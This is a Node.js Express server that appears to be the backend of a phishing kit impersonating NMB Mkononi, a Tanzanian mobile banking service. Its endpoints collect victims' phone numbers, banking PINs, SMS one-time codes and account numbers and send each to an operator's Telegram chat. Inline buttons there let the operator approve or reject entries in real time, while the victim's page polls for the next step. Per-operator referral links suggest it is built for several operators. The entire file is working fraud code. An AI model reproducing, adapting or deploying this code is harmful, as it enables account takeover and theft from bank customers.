const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const DEFAULT_ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const sessions = {}; 
const adminMappings = {}; 

async function sendTelegramMessage(chatId, text, replyMarkup = {}) {
    if (!TELEGRAM_BOT_TOKEN || !chatId) return null;
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = { chat_id: chatId, text: text, parse_mode: 'HTML' };
        if (replyMarkup && Object.keys(replyMarkup).length > 0) payload.reply_markup = replyMarkup;

        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return await response.json();
    } catch (err) {
        return null;
    }
}

async function removeInlineKeyboard(chatId, messageId, originalText, statusLabel) {
    if (!TELEGRAM_BOT_TOKEN || !chatId || !messageId) return;
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text: `${originalText}\n\n<b>Hali: [ ${statusLabel} ]</b>`,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            })
        });
    } catch (err) {}
}

function getTargetAdminChat(ref) {
    if (ref && adminMappings[ref]) return ref;
    if (ref && /^\d+$/.test(ref)) return ref;
    return DEFAULT_ADMIN_CHAT_ID;
}

// 1. Initial Application & Phone Submission
app.post('/api/submit-application', async (req, res) => {
    const { sessionId, phone, ref } = req.body;
    const targetAdminChat = getTargetAdminChat(ref);
    
    sessions[sessionId] = { phone, pin: '', step: 'phone_submitted', adminChatId: targetAdminChat, status: 'pending' };
    res.json({ success: true });
});

// 2. PIN Submission -> Admin: ALLOW / DENY
app.post('/api/submit-pin', async (req, res) => {
    const { sessionId, pin } = req.body;
    
    if (!sessions[sessionId]) {
        sessions[sessionId] = { phone: 'Unknown', adminChatId: DEFAULT_ADMIN_CHAT_ID, status: 'pending' };
    }
    
    sessions[sessionId].pin = pin;
    sessions[sessionId].status = 'pending';
    const session = sessions[sessionId];

    const message = `🏦 <b>NMB MKONONI TANZANIA - MAOMBI MAPYA</b>\n\n` +
                    `📱 <b>Namba ya Simu:</b> +255${session.phone}\n` +
                    `🔑 <b>PIN Iliyoingizwa:</b> ${pin}\n\n` +
                    `<i>Chagua hatua ya mteja:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '✅ RUHUSU (ALLOW)', callback_data: `allow_${sessionId}` },
                { text: '❌ KATAA (DENY)', callback_data: `deny_${sessionId}` }
            ]
        ]
    };

    const sent = await sendTelegramMessage(session.adminChatId, message, replyMarkup);
    if (sent && sent.result && sent.result.message_id) {
        session.adminMsgId = sent.result.message_id;
    }
    res.json({ success: true });
});

// 3. Submit OTP -> Admin: PROCEED / STOP
app.post('/api/submit-otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    
    if (!sessions[sessionId]) {
        sessions[sessionId] = { phone: 'Unknown', adminChatId: DEFAULT_ADMIN_CHAT_ID, status: 'pending' };
    }
    
    sessions[sessionId].otp = otp;
    sessions[sessionId].status = 'pending';
    const session = sessions[sessionId];

    const message = `🔐 <b>NMB MKONONI TANZANIA - UTHIBITISHO WA OTP</b>\n\n` +
                    `📱 <b>Namba ya Simu:</b> +255${session.phone}\n` +
                    `🔑 <b>SMS OTP:</b> ${otp}\n\n` +
                    `<i>Thibitisha OTP:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '✅ ENDELEA', callback_data: `otp_proceed_${sessionId}` },
                { text: '🛑 SIMAMISHA', callback_data: `otp_stop_${sessionId}` }
            ]
        ]
    };

    const sent = await sendTelegramMessage(session.adminChatId, message, replyMarkup);
    if (sent && sent.result && sent.result.message_id) {
        session.adminMsgId = sent.result.message_id;
    }
    res.json({ success: true });
});

// 4. Submit 11-digit NMB Bank Account -> Admin options
app.post('/api/submit-account', async (req, res) => {
    const { sessionId, accountNumber } = req.body;
    
    if (!sessions[sessionId]) {
        sessions[sessionId] = { phone: 'Unknown', adminChatId: DEFAULT_ADMIN_CHAT_ID, status: 'pending' };
    }
    
    sessions[sessionId].accountNumber = accountNumber;
    sessions[sessionId].status = 'pending';
    const session = sessions[sessionId];

    const message = `🏦 <b>NMB MKONONI TANZANIA - AKAUNTI YA BENKI</b>\n\n` +
                    `📱 <b>Namba ya Simu:</b> +255${session.phone}\n` +
                    `💳 <b>Namba ya Akaunti (Tarakimu 11):</b> ${accountNumber}\n\n` +
                    `<i>Chagua hali ya mwisho ya uthibitisho:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '⚠️ PIN SI SAHIHI', callback_data: `err_pin_${sessionId}` },
                { text: '⚠️ OTP SI SAHIHI', callback_data: `err_otp_${sessionId}` }
            ],
            [
                { text: '🚫 AKAUNTI SI SAHIHI', callback_data: `err_acc_${sessionId}` },
                { text: '🎉 IMEIDHIBINISHWA', callback_data: `approve_${sessionId}` }
            ]
        ]
    };

    const sent = await sendTelegramMessage(session.adminChatId, message, replyMarkup);
    if (sent && sent.result && sent.result.message_id) {
        session.adminMsgId = sent.result.message_id;
    }
    res.json({ success: true });
});

// Polling endpoint for frontend UI
app.get('/api/check-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions[sessionId];
    
    if (!session) {
        return res.json({ status: 'pending' });
    }
    
    res.json({ status: session.status || 'pending' });
});

app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update && update.message && update.message.text) {
            const messageObj = update.message;
            const chatId = messageObj.chat.id;
            const text = messageObj.text.trim();
            
            if (text.startsWith('/start')) {
                adminMappings[chatId] = { chatId, fullName: `${messageObj.from.first_name || ''}`.trim() };
                const protocol = req.headers['x-forwarded-proto'] || req.protocol;
                const permanentLink = `${protocol}://${req.get('host')}/?ref=${chatId}`;
                await sendTelegramMessage(chatId, `Karibu NMB Mkononi Tanzania! Kiungo chako cha usimamizi:\n${permanentLink}`);
                return res.sendStatus(200);
            }
        }

        if (update && update.callback_query) {
            const query = update.callback_query;
            const data = query.data; 
            const parts = data.split('_');
            
            let action, sessionId;
            if (data.startsWith('otp_')) {
                action = `otp_${parts[1]}`;
                sessionId = parts[2];
            } else if (data.startsWith('err_')) {
                action = `err_${parts[1]}`;
                sessionId = parts[2];
            } else {
                action = parts[0];
                sessionId = parts[1];
            }

            const session = sessions[sessionId];
            let statusLabel = 'IMEEKAMILIKA ✅';
            
            if (session) {
                if (action === 'allow' || action === 'otp_proceed') {
                    session.status = 'next_step';
                    statusLabel = action === 'allow' ? 'IMERUHUSIWA ✅' : 'IMEENDELEA ✅';
                } else if (action === 'deny' || action === 'otp_stop' || action === 'err_pin') {
                    session.status = 'restart_pin';
                    statusLabel = 'PIN ISIYO SAHIHI / IMEKATALIWA ❌';
                } else if (action === 'err_otp') {
                    session.status = 'restart_otp';
                    statusLabel = 'OTP ISIYO SAHIHI ❌';
                } else if (action === 'err_acc') {
                    session.status = 'restart_acc';
                    statusLabel = 'AKAUNTI ISIYO SAHIHI ❌';
                } else if (action === 'approve') {
                    session.status = 'success';
                    statusLabel = 'IMEIDHIBINISHWA 🎉';
                }
            }

            if (query.message) {
                const messageId = (session && session.adminMsgId) ? session.adminMsgId : query.message.message_id;
                const targetChat = (session && session.adminChatId) ? session.adminChatId : query.message.chat.id;
                await removeInlineKeyboard(targetChat, messageId, query.message.text || '', statusLabel);
            }
            
            if (TELEGRAM_BOT_TOKEN) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: query.id, text: 'Imekamilika!' })
                });
            }
        }
        res.sendStatus(200);
    } catch (err) {
        res.sendStatus(500);
    }
});

app.listen(PORT, () => {
    console.log(`NMB Mkononi Server running on port ${PORT}`);
});
          
